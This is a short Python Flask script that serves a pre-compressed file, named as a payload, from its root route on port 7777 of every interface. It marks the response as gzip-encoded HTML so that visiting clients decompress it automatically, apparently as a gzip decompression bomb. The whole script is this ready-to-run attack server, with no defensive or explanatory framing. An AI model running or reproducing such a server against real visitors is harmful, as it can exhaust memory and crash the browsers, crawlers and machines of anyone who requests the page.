from flask import Flask, Response


app = Flask(__name__)

g1 = "cake.gzip"
g5 = "cake5.gzip"
g = g5

@app.route('/')
def drop():
	with open(g, "rb") as payload_gzip:
		resp = payload_gzip.read()
	final_response = Response(response=resp, status=200, mimetype="text/html")
	final_response.headers['Content-Encoding'] = 'gzip'
	return final_response


if __name__ == '__main__':
    app.run(debug=False,host='0.0.0.0',port=7777)
